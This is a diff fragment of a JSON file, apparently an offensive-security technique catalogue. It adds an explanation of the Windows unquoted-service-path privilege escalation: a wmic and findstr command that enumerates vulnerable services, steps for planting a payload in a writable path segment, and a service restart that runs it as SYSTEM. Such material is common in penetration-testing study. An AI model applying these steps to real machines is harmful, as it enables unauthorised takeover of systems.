@@ -118,5 +118,6 @@
       "label": "Restart the service to trigger it",
       "command": "sc stop <service> & sc start <service>"
     }
-  ]
+  ],
+  "explain": "Exploits an unquoted service path containing spaces:\n  wmic service get name,displayname,pathname,startmode   list services\n  | findstr /i \"auto\"      keep auto-start ones\n  | findstr /i /v \"c:\\windows\\\\\"   drop system-dir services\n  | findstr /i /v \"\\\"\"     keep only paths that are NOT quoted\nWindows tries each space-delimited prefix (C:\\Program.exe, ...), so drop a payload named to match a writable earlier segment and restart the service to run it as SYSTEM."
 }
